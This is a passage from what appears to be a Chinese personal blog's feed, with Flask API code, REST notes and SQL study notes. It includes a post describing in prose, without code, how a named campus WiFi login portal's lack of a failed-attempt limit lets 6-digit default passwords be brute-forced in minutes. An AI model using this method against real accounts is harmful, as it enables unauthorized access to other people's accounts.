dateReleased=i[<span class="string">&#x27;dateReleased&#x27;</span>])</span><br><span class="line">        db.session.add(de)</span><br><span class="line">        db.session.commit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/create&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">join_db</span>():</span></span><br><span class="line">    db.drop_all()</span><br><span class="line">    db.create_all()</span><br><span class="line">    dt = get_data()</span><br><span class="line">    <span class="comment"># dt = test_data</span></span><br><span class="line">    creat_db(dt)</span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&#x27;mes&#x27;</span>: <span class="string">&#x27;creat database OK&#x27;</span>&#125;, <span class="number">200</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/show&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_db</span>():</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        rt = []</span><br><span class="line">        <span class="keyword">for</span> __data <span class="keyword">in</span> Data.query.<span class="built_in">all</span>():</span><br><span class="line">            __detail = Detail.query.<span class="built_in">filter</span>(Detail.detail_id == __data.movie).first()</span><br><span class="line">            tp = json.dumps(&#123;</span><br><span class="line">                <span class="string">&quot;data&quot;</span>: &#123;</span><br><span class="line">                    <span class="string">&quot;createdAt&quot;</span>: __data.createdAt,</span><br><span class="line">                    <span class="string">&quot;updatedAt&quot;</span>: __data.updatedAt,</span><br><span class="line">                    <span class="string">&quot;id&quot;</span>: __data.data_id,</span><br><span class="line">                    <span class="string">&quot;poster&quot;</span>: __data.poster,</span><br><span class="line">                    <span class="string">&quot;name&quot;</span>: __data.name,</span><br><span class="line">                    <span class="string">&quot;genre&quot;</span>: __data.genre,</span><br><span class="line">                    <span class="string">&quot;description&quot;</span>: __data.description,</span><br><span class="line">                    <span class="string">&quot;language&quot;</span>: __data.language,</span><br><span class="line">                    <span class="string">&quot;country&quot;</span>: __data.country,</span><br><span class="line">                    <span class="string">&quot;lang&quot;</span>: __data.lang,</span><br><span class="line">                    <span class="string">&quot;shareImage&quot;</span>: __data.shareImage,</span><br><span class="line">                    <span class="string">&quot;movie&quot;</span>: __data.movie</span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="string">&quot;createdAt&quot;</span>: __detail.createdAt,</span><br><span class="line">                <span class="string">&quot;updatedAt&quot;</span>: __detail.updatedAt,</span><br><span class="line">                <span class="string">&quot;id&quot;</span>: __detail.detail_id,</span><br><span class="line">                <span class="string">&quot;originalName&quot;</span>: __detail.originalName,</span><br><span class="line">                <span class="string">&quot;imdbVotes&quot;</span>: __detail.imdbVotes,</span><br><span class="line">                <span class="string">&quot;imdbRating&quot;</span>: __detail.imdbRating,</span><br><span class="line">                <span class="string">&quot;rottenRating&quot;</span>: __detail.rottenRating,</span><br><span class="line">                <span class="string">&quot;rottenVotes&quot;</span>: __detail.rottenVotes,</span><br><span class="line">                <span class="string">&quot;year&quot;</span>: __detail.year,</span><br><span class="line">                <span class="string">&quot;imdbId&quot;</span>: __detail.imdbId,</span><br><span class="line">                <span class="string">&quot;alias&quot;</span>: __detail.alias,</span><br><span class="line">                <span class="string">&quot;doubanId&quot;</span>: __detail.doubanId,</span><br><span class="line">                <span class="string">&quot;type&quot;</span>: __detail.<span class="built_in">type</span>,</span><br><span class="line">                <span class="string">&quot;doubanRating&quot;</span>: __detail.doubanRating,</span><br><span class="line">                <span class="string">&quot;doubanVotes&quot;</span>: __detail.doubanVotes,</span><br><span class="line">                <span class="string">&quot;duration&quot;</span>: __detail.duration,</span><br><span class="line">                <span class="string">&quot;dateReleased&quot;</span>: __detail.dateReleased.strftime(<span class="string">&quot;%Y-%m-%d&quot;</span>)</span><br><span class="line">            &#125;, ensure_ascii=<span class="literal">False</span>)</span><br><span class="line">            rt.append(tp)</span><br><span class="line">        <span class="keyword">return</span> json.dumps(rt, ensure_ascii=<span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&#x27;mes&#x27;</span>: <span class="string">&#x27;NoData&#x27;</span>&#125;, <span class="number">200</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/query/&lt;id&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">query_db</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">    _id = <span class="built_in">id</span></span><br><span class="line">    __data = Data.query.<span class="built_in">filter</span>(Data.<span class="built_in">id</span> == _id).first()</span><br><span class="line">    __detail = Detail.query.<span class="built_in">filter</span>(Detail.detail_id == __data.movie).first()</span><br><span class="line">    <span class="keyword">return</span> json.dumps(&#123;</span><br><span class="line">        <span class="string">&quot;data&quot;</span>: &#123;</span><br><span class="line">                <span class="string">&quot;createdAt&quot;</span>: __data.createdAt,</span><br><span class="line">                <span class="string">&quot;updatedAt&quot;</span>: __data.updatedAt,</span><br><span class="line">                <span class="string">&quot;id&quot;</span>: __data.data_id,</span><br><span class="line">                <span class="string">&quot;poster&quot;</span>: __data.poster,</span><br><span class="line">                <span class="string">&quot;name&quot;</span>: __data.name,</span><br><span class="line">                <span class="string">&quot;genre&quot;</span>: __data.genre,</span><br><span class="line">                <span class="string">&quot;description&quot;</span>: __data.description,</span><br><span class="line">                <span class="string">&quot;language&quot;</span>: __data.language,</span><br><span class="line">                <span class="string">&quot;country&quot;</span>: __data.country,</span><br><span class="line">                <span class="string">&quot;lang&quot;</span>: __data.lang,</span><br><span class="line">                <span class="string">&quot;shareImage&quot;</span>: __data.shareImage,</span><br><span class="line">                <span class="string">&quot;movie&quot;</span>: __data.movie</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&quot;createdAt&quot;</span>: __detail.createdAt,</span><br><span class="line">        <span class="string">&quot;updatedAt&quot;</span>: __detail.updatedAt,</span><br><span class="line">        <span class="string">&quot;id&quot;</span>: __detail.detail_id,</span><br><span class="line">        <span class="string">&quot;originalName&quot;</span>: __detail.originalName,</span><br><span class="line">        <span class="string">&quot;imdbVotes&quot;</span>: __detail.imdbVotes,</span><br><span class="line">        <span class="string">&quot;imdbRating&quot;</span>: __detail.imdbRating,</span><br><span class="line">        <span class="string">&quot;rottenRating&quot;</span>: __detail.rottenRating,</span><br><span class="line">        <span class="string">&quot;rottenVotes&quot;</span>: __detail.rottenVotes,</span><br><span class="line">        <span class="string">&quot;year&quot;</span>: __detail.year,</span><br><span class="line">        <span class="string">&quot;imdbId&quot;</span>: __detail.imdbId,</span><br><span class="line">        <span class="string">&quot;alias&quot;</span>: __detail.alias,</span><br><span class="line">        <span class="string">&quot;doubanId&quot;</span>: __detail.doubanId,</span><br><span class="line">        <span class="string">&quot;type&quot;</span>: __detail.<span class="built_in">type</span>,</span><br><span class="line">        <span class="string">&quot;doubanRating&quot;</span>: __detail.doubanRating,</span><br><span class="line">        <span class="string">&quot;doubanVotes&quot;</span>: __detail.doubanVotes,</span><br><span class="line">        <span class="string">&quot;duration&quot;</span>: __detail.duration,</span><br><span class="line">        <span class="string">&quot;dateReleased&quot;</span>: __detail.dateReleased.strftime(<span class="string">&quot;%Y-%m-%d&quot;</span>)</span><br><span class="line">    &#125;, ensure_ascii=<span class="literal">False</span>), <span class="number">200</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/clear&#x27;</span>, methods=[<span class="string">&#x27;DELETE&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">clear_db</span>():</span></span><br><span class="line">    db.drop_all()</span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&#x27;mes&#x27;</span>: <span class="string">&#x27;OK&#x27;</span>&#125;, <span class="number">200</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&lt;h1&gt;什么都没有&lt;/h1&gt;&#x27;</span>, <span class="number">200</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;之前域名&lt;a href=&quot;https://haorical.xyz/&quot;&gt;https://haorical.xyz&lt;/a&gt;过期了，只买了一年有点后悔了，续费太贵了，只能重新买了4年的&lt;a href=&quot;https://haorical.top/&quot;&gt;https://haorical.top&lt;/a&gt;，二级域名&lt;a href=&quot;https://blog.haorical.xyz/&quot;&gt;https://blog.haorical.xyz&lt;/a&gt;用来当博客地址&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;浅谈REST风格&quot;&gt;&lt;a href=&quot;#浅谈REST风格&quot; class=&quot;headerlink&quot; title=&quot;浅谈REST风格&quot;&gt;&lt;/a&gt;浅谈REST风格&lt;/h2&gt;&lt;p&gt;REST 全称是Representational State Transfer，中文意思是表现层状态转化。&lt;/p&gt;
&lt;p&gt;简而言之，利用不同http请求方法来完成相关操作&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;GET 表示获取资源&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;POST 表示新增资源&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;PUT 表示修改资源&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;DELETE 表示删除资源&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;再利用url来表示操作对象&lt;/p&gt;
&lt;p&gt;类似&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;获取所有用户列表：GET &amp;#x2F;users&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;获取用户a的详情：GET &amp;#x2F;users&amp;#x2F;a&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;新增用户：POST &amp;#x2F;users&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;修改用户a的信息：PUT &amp;#x2F;users&amp;#x2F;a&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;删除用户a：DELETE &amp;#x2F;users&amp;#x2F;a&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;strong&gt;我感觉是另一种方式的所见即所得，喜闻乐见&lt;/strong&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="python实践" scheme="http://blog.haorical.top/categories/python%E5%AE%9E%E8%B7%B5/"/>
    
    
    <category term="python" scheme="http://blog.haorical.top/tags/python/"/>
    
    <category term="flask" scheme="http://blog.haorical.top/tags/flask/"/>
    
  </entry>
  
  <entry>
    <title>一种基于WiFi登录的用户密码暴力破解方法</title>
    <link href="http://blog.haorical.top/posts/69af83f3/"/>
    <id>http://blog.haorical.top/posts/69af83f3/</id>
    <published>2022-01-17T06:56:31.000Z</published>
    <updated>2022-01-17T07:15:08.254Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h2><p><strong>只用来记录基本思路，不提供任何代码，测试账号已经过当事人同意</strong></p><span id="more"></span><h2 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h2><p>该漏洞的主要是基于弱密码方式暴力破解，主要是因为6位数字破解时间很短，主要限制因素就是cpu和网络环境</p><p>测试了几个容易出现弱密码的站点，大都做了限制，如教务部，微学工等，失败次数过多会被禁止登录</p><p>wifi(CUMT_Stu)登录也会出现相同情况，登录次数过多，会返回userid locked，但对失败次数没有限制，只要一次登录成功，便会返回成功登录</p><p>可以利用此漏洞来实现密码的暴力破解，应用之前模拟登录校园网的脚本，稍微更改即可，同时使用多线程来优化，测试最快可在2min内获得登录密码，效果非常好</p><h2 id="避免方法"><a href="#避免方法" class="headerlink" title="避免方法"></a>避免方法</h2><p>还是建议大家稍微改改密码，不要老是用默认的，虽然6位，但和123456基本没啥区别，可能被不法分子利用，来登录其他可能的站点。</p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;前提&quot;&gt;&lt;a href=&quot;#前提&quot; class=&quot;headerlink&quot; title=&quot;前提&quot;&gt;&lt;/a&gt;前提&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;只用来记录基本思路，不提供任何代码，测试账号已经过当事人同意&lt;/strong&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="python实践" scheme="http://blog.haorical.top/categories/python%E5%AE%9E%E8%B7%B5/"/>
    
    
    <category term="python" scheme="http://blog.haorical.top/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>sql学习</title>
    <link href="http://blog.haorical.top/posts/e8cf058b/"/>
    <id>http://blog.haorical.top/posts/e8cf058b/</id>
    <published>2022-01-16T12:28:22.000Z</published>
    <updated>2022-01-23T06:36:11.563Z</updated>
    
    <content type="html"><![CDATA[<h2 id="配置数据库环境"><a href="#配置数据库环境" class="headerlink" title="配置数据库环境"></a>配置数据库环境</h2><p>建议直接买个云mysql服务器，本地配置太折磨人了</p><h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> databases;</span><br><span class="line">use [数据库名]</span><br><span class="line"><span class="keyword">show</span> tables;</span><br><span class="line"><span class="keyword">describe</span> [表名]； <span class="comment">--显示表信息</span></span><br><span class="line">creat database [db] <span class="comment">--创建数据库</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">多行注释</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h2 id="关系模型"><a href="#关系模型" class="headerlink" title="关系模型"></a>关系模型</h2><h3 id="主键"><a href="#主键" class="headerlink" title="主键"></a>主键</h3><p>一般id,基本不用联合主键</p><p>唯一区别两条记录是否相同</p><p>不使用业务相关</p><p>id 两类:</p><ol><li>自增整数</li><li>GUID</li></ol><h3 id="外键"><a href="#外键" class="headerlink" title="外键"></a>外键</h3><h4 id="一对多"><a href="#一对多" class="headerlink" title="一对多"></a>一对多</h4><p>通过一个表的外键关联到另一个表，我们可以定义出一对多关系</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 添加外键约束</span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> students</span><br><span class="line"><span class="keyword">ADD</span> <span class="keyword">CONSTRAINT</span> fk_class_id <span class="comment">-- 约束名称，随便取</span></span><br><span class="line"><span class="keyword">FOREIGN</span> KEY (class_id) <span class="comment">--指定外键</span></span><br><span class="line"><span class="keyword">REFERENCES</span> classes (id); <span class="comment">-- 将外键关联到classes主键id</span></span><br><span class="line"># 删除外键约束 并不删除列</span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> students</span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">FOREIGN</span> KEY fk_class_id;</span><br></pre></td></tr></table></figure><p>外键约束的名称fk_class_id可以任意，FOREIGN KEY (class_id)指定了class_id作为外键，REFERENCES classes (id)指定了这个外键将关联到classes表的id列（即classes表的主键）。</p><h4 id="多对多"><a href="#多对多" class="headerlink" title="多对多"></a>多对多</h4><p>多对多关系实际上是通过两个一对多关系实现的，即通过一个中间表，关联两个一对多关系，就形成了多对多关系</p><p>teacher–&gt;teacher_class&lt;–class</p><h4 id="一对一"><a href="#一对一" class="headerlink" title="一对一"></a>一对一</h4><p>一个表的记录对应到另一个表的唯一一个记录。</p><p>有细心的童鞋会问，既然是一对一关系，那为啥不给students表增加一个mobile列，这样就能合二为一了？</p><p>如果业务允许，完全可以把两个表合为一个表。但是，有些时候，如果某个学生没有手机号，那么，contacts表就不存在对应的记录。实际上，一对一关系准确地说，是contacts表一对一对应students表。</p><p>还有一些应用会把一个大表拆成两个一对一的表，目的是把经常读取和不经常读取的字段分开，以获得更高的性能。例如，把一个大的用户表分拆为用户基本信息表user_info和用户详细信息表user_profiles，大部分时候，只需要查询user_info表，并不需要查询user_profiles表，这样就提高了查询速度。</p><h3 id="索引"><a href="#索引" class="headerlink" title="索引"></a>索引</h3><h4 id="索引-1"><a href="#索引-1" class="headerlink" title="索引"></a>索引</h4><p>在关系数据库中，如果有上万甚至上亿条记录，在查找记录的时候，想要获得非常快的速度，就需要使用索引。</p><p>索引的效率取决于索引列的值是否散列，即该列的值如果越互不相同，那么索引效率越高。<code>类似hash</code></p><p>对于主键，关系数据库会自动对其创建主键索引。使用主键索引的效率是最高的，因为主键会保证绝对唯一。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 添加索引</span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> students</span><br><span class="line"><span class="keyword">ADD</span> INDEX idx_name_score (name, score); <span class="comment">--包含name score两列，名称为idx_name_score的索引</span></span><br></pre></td></tr></table></figure><h4 id="唯一索引"><a href="#唯一索引" class="headerlink" title="唯一索引"></a>唯一索引</h4><p>不是主键但又唯一，即不能出现两条记录存储了同一个身份证号。这个时候，就可以给该列添加一个唯一索引。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> students</span><br><span class="line"><span class="keyword">ADD</span> <span class="keyword">UNIQUE</span> INDEX uni_name (name) <span class="comment">--name列添加唯一索引</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> students</span><br><span class="line"><span class="keyword">ADD</span> <span class="keyword">CONSTRAINT</span> uni_name <span class="keyword">UNIQUE</span> (name) <span class="comment">--name列添加唯一约束，具有唯一性</span></span><br></pre></td></tr></table></figure><h2 id="查询"><a href="#查询" class="headerlink" title="查询"></a>查询</h2><h3 id="基本查询"><a href="#基本查询" class="headerlink" title="基本查询"></a>基本查询</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> <span class="operator">&lt;</span>表名<span class="operator">&gt;</span> <span class="comment">--查询数据库表的所有数据,返回二维表</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> <span class="number">1</span>;来测试数据库连接。</span><br></pre></td></tr></table></figure><p>SELECT语句其实并不要求一定要有FROM子句。</p><h3 id="条件查询"><a href="#条件查询" class="headerlink" title="条件查询"></a>条件查询</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> <span class="operator">&lt;</span>表名<span class="operator">&gt;</span> <span class="keyword">WHERE</span> <span class="operator">&lt;</span>条件表达式<span class="operator">&gt;</span></span><br><span class="line"><span class="operator">&lt;</span>条件<span class="number">1</span><span class="operator">&gt;</span> <span class="keyword">AND</span> <span class="operator">&lt;</span>条件<span class="number">2</span><span class="operator">&gt;</span></span><br><span class="line"><span class="operator">&lt;</span>条件<span class="number">1</span><span class="operator">&gt;</span> <span class="keyword">OR</span> <span class="operator">&lt;</span>条件<span class="number">2</span><span class="operator">&gt;</span></span><br><span class="line"></span><br><span class="line">e.g. score <span class="operator">&gt;=</span> <span class="number">80</span> <span class="keyword">AND</span> gender <span class="operator">=</span> <span class="string">&#x27;M&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="operator">&lt;&gt;</span> 表示<span class="keyword">NOT</span> 类似<span class="operator">!=</span></span><br><span class="line"></span><br><span class="line">使用<span class="keyword">LIKE</span>判断相似 </span><br><span class="line">name <span class="keyword">LIKE</span> <span class="string">&#x27;ab%&#x27;</span></span><br><span class="line"><span class="operator">%</span>表示任意字符，例如<span class="string">&#x27;ab%&#x27;</span>将匹配<span class="string">&#x27;ab&#x27;</span>，<span class="string">&#x27;abc&#x27;</span>，<span class="string">&#x27;abcd&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="投影查询"><a href="#投影查询" class="headerlink" title="投影查询"></a>投影查询</h3><p>如果我们只希望返回某些列的数据，而不是所有列的数据，我们可以用SELECT 列1, 列2, 列3 FROM …，让结果集仅包含指定列。这种操作称为投影查询。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> id, score, name <span class="keyword">FROM</span> students;</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> 列<span class="number">1</span> 别名<span class="number">1</span>, 列<span class="number">2</span> 别名<span class="number">2</span>, 列<span class="number">3</span> 别名<span class="number">3</span> <span class="keyword">FROM</span> ... <span class="keyword">WHERE</span> <span class="comment">--起别名</span></span><br></pre></td></tr></table></figure><p>结果集的列的顺序和原表可以不一样</p><h3 id="排序"><a href="#排序" class="headerlink" title="排序"></a>排序</h3><p>order by</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> id, name, gender, score <span class="keyword">FROM</span> students <span class="keyword">ORDER</span> <span class="keyword">BY</span> score; <span class="comment">-- 成绩从低到高排序</span></span><br><span class="line"><span class="keyword">SELECT</span> id, name, gender, score <span class="keyword">FROM</span> students <span class="keyword">ORDER</span> <span class="keyword">BY</span> score <span class="keyword">DESC</span>; <span class="comment">-- 加个 DESC 就成倒序了</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> id, name, gender, score</span><br><span class="line"><span class="keyword">FROM</span> students</span><br><span class="line"><span class="keyword">WHERE</span> class_id <span class="operator">=</span> <span class="number">1</span></span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> score <span class="keyword">DESC</span>;</span><br><span class="line"><span class="comment">-- oreder by 放在 where 后面</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> score <span class="keyword">DESC</span>, gender <span class="comment">--依次轮流排 先按score 倒着排，再按gender排</span></span><br></pre></td></tr></table></figure><h3 id="分页查询"><a href="#分页查询" class="headerlink" title="分页查询"></a>分页查询</h3><p>使用LIMIT <M> OFFSET <N>可以对结果集进行分页，每次查询返回结果集的一部分；</p><p>分页查询需要先确定每页的数量和当前页数，然后确定LIMIT和OFFSET的值。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LIMIT <span class="operator">&lt;</span>N<span class="operator">-</span>M<span class="operator">&gt;</span> <span class="keyword">OFFSET</span> <span class="operator">&lt;</span>M<span class="operator">&gt;</span> <span class="comment">--截取第M~N条记录</span></span><br></pre></td></tr></table></figure><p>LIMIT总是设定为pageSize；<br>OFFSET计算公式为pageSize * (pageIndex - 1)。</p><p>pageSize：一页多少条记录</p><p>pageIndex：第几页</p><p><code>在MySQL中，LIMIT 15 OFFSET 30还可以简写成LIMIT 30, 15</code></p><h3 id="聚合查询"><a href="#聚合查询" class="headerlink" title="聚合查询"></a>聚合查询</h3><h4 id="聚合查询-1"><a href="#聚合查询-1" class="headerlink" title="聚合查询"></a>聚合查询</h4><p>使用SQL提供的聚合查询，我们可以方便地计算总数、合计值、平均值、最大值和最小值</p><p>聚合查询也可以添加WHERE条件。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="built_in">COUNT</span>(<span class="operator">*</span>) <span class="keyword">FROM</span> students; <span class="comment">--统计所有列的行数</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="built_in">COUNT</span>(<span class="operator">*</span>) boys <span class="keyword">FROM</span> students <span class="keyword">WHERE</span> gender <span class="operator">=</span> <span class="string">&#x27;M&#x27;</span>; <span class="comment">--统计多少女生</span></span><br><span class="line"></span><br><span class="line"># 常见聚合函数</span><br><span class="line">SUM计算某一列的合计值，该列必须为数值类型</span><br><span class="line">AVG计算某一列的平均值，该列必须为数值类型</span><br><span class="line">MAX计算某一列的最大值</span><br><span class="line">MIN计算某一列的最小值</span><br></pre></td></tr></table></figure><p>如果聚合查询的WHERE条件没有匹配到任何行，COUNT()会返回0，而SUM()、AVG()、MAX()和MIN()会返回NULL</p><h4 id="分组聚合"><a href="#分组聚合" class="headerlink" title="分组聚合"></a>分组聚合</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> class_id, <span class="built_in">COUNT</span>(<span class="operator">*</span>) num <span class="keyword">FROM</span> students <span class="keyword">GROUP</span> <span class="keyword">BY</span> class_id;</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> class_id, gender, <span class="built_in">COUNT</span>(<span class="operator">*</span>) num <span class="keyword">FROM</span> students <span class="keyword">GROUP</span> <span class="keyword">BY</span> class_id, gender; <span class="comment">-- 使用多个列分组</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> class_id, <span class="built_in">AVG</span>(score) <span class="keyword">FROM</span> students <span class="keyword">GROUP</span> <span class="keyword">BY</span> class_id; <span class="comment">--查询每个班级平均分</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> class_id,gender,<span class="built_in">AVG</span>(score) <span class="keyword">FROM</span> students <span class="keyword">GROUP</span> <span class="keyword">BY</span> class_id,gender; <span class="comment">-- 查询每个班男生女生平均分</span></span><br></pre></td></tr></table></figure><p>聚合查询的列中，只能放入分组的列。</p><h3 id="多表查询"><a href="#多表查询" class="headerlink" title="多表查询"></a>多表查询</h3><p>笛卡尔乘积，尽量不使用</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> students, classes;</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span></span><br><span class="line">    s.id sid,</span><br><span class="line">    s.name,</span><br><span class="line">    s.gender,</span><br><span class="line">    s.score,</span><br><span class="line">    c.id cid,</span><br><span class="line">    c.name cname</span><br><span class="line"><span class="keyword">FROM</span> students s, classes c;</span><br><span class="line"><span class="keyword">WHERE</span> s.gender <span class="operator">=</span> <span class="string">&#x27;M&#x27;</span> <span class="keyword">AND</span> c.id <span 